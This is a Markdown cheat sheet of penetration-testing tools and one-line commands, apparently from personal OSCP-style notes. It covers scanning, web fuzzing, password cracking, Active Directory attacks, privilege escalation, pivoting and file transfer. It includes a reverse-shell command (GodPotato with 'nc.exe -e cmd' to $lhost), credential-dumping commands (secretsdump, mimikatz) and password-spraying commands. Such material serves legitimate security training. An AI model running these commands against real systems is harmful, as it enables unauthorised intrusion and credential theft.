# Tools Index

> **Quick reference สำหรับ tools ทั้งหมดที่ใช้บ่อย จัดเรียงตาม category**

---

## 📡 Reconnaissance & Scanning

| Tool | Purpose | Quick Command |
|------|---------|---------------|
| **Nmap** | Port scanning | `nmap -sC -sV -p- $rhost` |
| **Rustscan** | Fast port scan | `rustscan -a $rhost -- -sC -sV` |
| **Masscan** | Mass scanning | `masscan -p1-65535 $rhost --rate=1000` |
| **Ping sweep** | Host discovery | `nmap -sn $cidr` |

---

## 🌐 Web Application

### Scanners & Fuzzing

| Tool | Purpose | Quick Command |
|------|---------|---------------|
| **Gobuster** | Directory bruteforce | `gobuster dir -u http://$rhost -w /usr/share/wordlists/dirb/common.txt` |
| **Feroxbuster** | Fast directory scan | `feroxbuster -u http://$rhost -w $seclists/Discovery/Web-Content/raft-medium-directories.txt` |
| **FFuf** | Fuzzing (dirs/params) | `ffuf -u http://$rhost/FUZZ -w wordlist.txt` |
| **Nikto** | Web vuln scanner | `nikto -h http://$rhost` |
| **WhatWeb** | Web fingerprint | `whatweb http://$rhost` |
| **Wappalyzer** | Tech detection | Browser extension |

### SQLi

| Tool | Purpose | Quick Command |
|------|---------|---------------|
| **SQLmap** | SQL injection | `sqlmap -u "http://$rhost/page?id=1" --batch --dbs` |
| **SQLmap (forms)** | Form injection | `sqlmap -r request.txt --batch` |

### Exploitation

| Tool | Purpose | Quick Command |
|------|---------|---------------|
| **Burp Suite** | Web proxy | Manual usage |
| **XSStrike** | XSS testing | `xsstrike -u "http://$rhost/page?q=test"` |
| **Commix** | Command injection | `commix -u "http://$rhost/page?cmd=id"` |

---

## 🔐 Credential Attacks

### Password Cracking

| Tool | Purpose | Quick Command |
|------|---------|---------------|
| **Hashcat** | GPU cracking | `hashcat -m 1000 hash.txt rockyou.txt` |
| **John** | CPU cracking | `john --wordlist=rockyou.txt hash.txt` |
| **Hydra** | Online bruteforce | `hydra -l admin -P rockyou.txt $rhost ssh` |
| **Medusa** | Online bruteforce | `medusa -h $rhost -u admin -P pass.txt -M ssh` |
| **NetExec (nxc)** | Multi-protocol spray | `nxc smb $rhost -u user -p pass` |
| **CrackMapExec** | Legacy (use NetExec) | `crackmapexec smb $rhost -u user -p pass` |

### Hash Extraction

| Tool | Purpose | Quick Command |
|------|---------|---------------|
| **secretsdump** | Dump hashes | `impacket-secretsdump $domain/$user:$pass@$rhost` |
| **mimikatz** | Windows creds | `sekurlsa::logonpasswords` |
| **pypykatz** | Parse lsass dump | `pypykatz lsa minidump lsass.dmp` |

---

## 📁 SMB & File Shares

| Tool | Purpose | Quick Command |
|------|---------|---------------|
| **smbclient** | SMB access | `smbclient -L //$rhost -N` |
| **smbmap** | Enum shares | `smbmap -H $rhost` |
| **enum4linux** | Full SMB enum | `enum4linux -a $rhost` |
| **enum4linux-ng** | Updated enum | `enum4linux-ng $rhost -A` |
| **NetExec** | SMB spray | `nxc smb $rhost -u users.txt -p passwords.txt` |

---

## 🏢 Active Directory

### Enumeration

| Tool | Purpose | Quick Command |
|------|---------|---------------|
| **BloodHound** | AD mapping | `bloodhound-python -u $user -p $pass -d $domain -c all` |
| **ldapsearch** | LDAP query | `ldapsearch -x -H ldap://$rhost -b "DC=corp,DC=local"` |
| **rpcclient** | RPC enum | `rpcclient -U "" -N $rhost` |
| **GetUserSPNs** | Kerberoast | `impacket-GetUserSPNs $domain/$user:$pass -dc-ip $rhost -request` |
| **GetNPUsers** | AS-REP roast | `impacket-GetNPUsers $domain/ -usersfile users.txt -dc-ip $rhost` |
| **ADRecon** | Full AD audit | PowerShell script |
| **PowerView** | AD PowerShell | `. .\PowerView.ps1` |

### Exploitation

| Tool | Purpose | Quick Command |
|------|---------|---------------|
| **psexec** | Remote exec | `impacket-psexec $domain/$user:$pass@$rhost` |
| **wmiexec** | WMI exec | `impacket-wmiexec $domain/$user:$pass@$rhost` |
| **smbexec** | SMB exec | `impacket-smbexec $domain/$user:$pass@$rhost` |
| **evil-winrm** | WinRM shell | `evil-winrm -i $rhost -u $user -p $pass` |
| **Rubeus** | Kerberos attacks | `Rubeus.exe kerberoast` |
| **Certipy** | ADCS attacks | `certipy find -u $user@$domain -p $pass -dc-ip $rhost` |

---

## ⬆️ Privilege Escalation

### Linux

| Tool | Purpose | Quick Command |
|------|---------|---------------|
| **linpeas.sh** | Auto enum | `./linpeas.sh` |
| **LinEnum.sh** | Auto enum | `./LinEnum.sh` |
| **pspy** | Process spy | `./pspy64` |
| **SUID finder** | Find SUID | `find / -perm -4000 2>/dev/null` |
| **GTFOBins** | SUID/Sudo bypass | https://gtfobins.github.io/ |

### Windows

| Tool | Purpose | Quick Command |
|------|---------|---------------|
| **winPEAS** | Auto enum | `.\winPEASx64.exe` |
| **PowerUp** | Misconfigs | `Invoke-AllChecks` |
| **Seatbelt** | Security audit | `Seatbelt.exe -group=all` |
| **PrintSpoofer** | Potato attack | `PrintSpoofer.exe -i -c cmd` |
| **GodPotato** | SeImpersonate | `GodPotato.exe -cmd "nc.exe -e cmd $lhost $lport"` |
| **LOLBAS** | Living off land | https://lolbas-project.github.io/ |

---

## 🔀 Lateral Movement & Pivoting

| Tool | Purpose | Quick Command |
|------|---------|---------------|
| **Ligolo-ng** | Modern pivoting | `./proxy -selfcert` |
| **Chisel** | HTTP tunneling | `chisel server -p 8000 --reverse` |
| **SSH Local** | Port forward | `ssh -L 8080:127.0.0.1:80 user@$rhost` |
| **SSH Dynamic** | SOCKS proxy | `ssh -D 1080 user@$rhost` |
| **Proxychains** | Proxy wrapper | `proxychains nmap -sT $rhost` |

---

## 🚀 Post-Exploitation

| Tool | Purpose | Quick Command |
|------|---------|---------------|
| **Sliver** | C2 framework | `sliver` |
| **Metasploit** | Exploitation | `msfconsole` |
| **Cobalt Strike** | Commercial C2 | Team server |
| **SharpHound** | AD collection | `SharpHound.exe -c all` |

---

## 📁 File Transfer

| Tool | Purpose | Quick Command |
|------|---------|---------------|
| **Python HTTP** | Serve files | `python3 -m http.server 80` |
| **Wget** | Download | `wget http://$lhost/file` |
| **Curl** | Download | `curl http://$lhost/file -o file` |
| **Certutil** | Windows DL | `certutil -urlcache -f http://$lhost/file file` |
| **PowerShell** | Windows DL | `iwr http://$lhost/file -o file` |
| **SCP** | SSH transfer | `scp file user@$rhost:/tmp/` |
| **Netcat** | Raw transfer | `nc -lvnp 4444 > file` |
| **SMB Server** | SMB share | `impacket-smbserver share . -smb2support` |

---

## 🔧 Utility Tools

| Tool | Purpose | Quick Command |
|------|---------|---------------|
| **rlwrap** | Better readline | `rlwrap nc -lvnp $lport` |
| **tmux** | Terminal mux | `tmux new -s hack` |
| **xfreerdp3** | RDP client | `xfreerdp3 /u:$user /p:$pass /v:$rhost /cert-ignore` |
| **rdesktop** | RDP client | `rdesktop $rhost` |
| **searchsploit** | Exploit DB | `searchsploit apache 2.4` |

---

## 📚 2john Tools (Hash Conversion)

| Tool | Purpose | Quick Command |
|------|---------|---------------|
| **zip2john** | ZIP password | `zip2john file.zip > hash.txt` |
| **rar2john** | RAR password | `rar2john file.rar > hash.txt` |
| **ssh2john** | SSH key | `ssh2john.py id_rsa > hash.txt` |
| **keepass2john** | KeePass DB | `keepass2john file.kdbx > hash.txt` |
| **pdf2john** | PDF password | `pdf2john.py file.pdf > hash.txt` |
| **office2john** | Office docs | `office2john.py file.docx > hash.txt` |
| **bitlocker2john** | BitLocker | `bitlocker2john -i image.raw > hash.txt` |

---

## 🔗 Quick Links

| Category | File |
|----------|------|
| Full Port Guide | [Port-Scanning.md](../1.Scanning/Port-Scanning.md) |
| Web Attacks | [7.Web-Exploit/](../7.Web-Exploit/) |
| AD Attacks | [3.AD-Exploit/](../3.AD-Exploit/) |
| Privilege Escalation | [4.Privilege-Escalation/](../4.Privilege-Escalation/) |
| Reverse Shells | [6.3.Reverse-Shell.md](../6.OS-Command/6.3.Reverse-Shell.md) |
| Wordlists | [6.4.Wordlist-Guide.md](../6.OS-Command/6.4.Wordlist-Guide.md) |
